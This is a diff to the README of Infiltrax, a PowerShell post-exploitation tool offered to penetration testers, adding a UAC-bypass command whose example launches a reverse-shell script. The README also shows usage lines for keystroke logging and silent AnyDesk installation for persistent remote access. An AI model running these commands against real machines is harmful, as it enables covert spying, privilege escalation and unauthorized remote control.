@@ -1,5 +1,5 @@
 # Infiltrax
-Infiltrax is a post-exploitation reconnaissance tool for penetration testers and red teams, designed to capture screenshots, retrieve clipboard contents, log keystrokes, and install AnyDesk for persistent remote access. 
+Infiltrax is a post-exploitation reconnaissance tool for penetration testers and red teams, designed to capture screenshots, retrieve clipboard contents, log keystrokes, bypass UAC and install AnyDesk for persistent remote access.
 
 ![Infiltrax](https://raw.githubusercontent.com/alexdhital/Infiltrax/main/usage.gif)
 
@@ -27,7 +27,11 @@ C:\Users\Administrator\Desktop> Invoke-Screenshot -Path "C:\Windows\Tasks\"
 ```powershell
 C:\Users\Administrator\Desktop> Invoke-KeyStrokeCapture -DurationInSeconds 30 -OutputPath C:\Windows\Tasks\keystrokes.txt
 ```
-5. **Installs anydesk silently, sets up unattended access and gets remote id** (Requires Administrative Privilege)
+5. **Bypass UAC to run any program in elevated context. Default program powershell.exe**
+```powershell
+C:\Users\Vlex\Desktop> Invoke-FodHelperBypass -program "C:\Windows\Tasks\reverse-shell.ps1"
+```
+7. **Installs anydesk silently, sets up unattended access and gets remote id** (Requires Administrative Privilege)
 ```powershell
 C:\Users\Administrator\Desktop> Invoke-AnyDeskInstall -InstallPath "C:\Users\Alex\AppData\Local\AnyDesk" -Password "Unattended123!" 
 ```
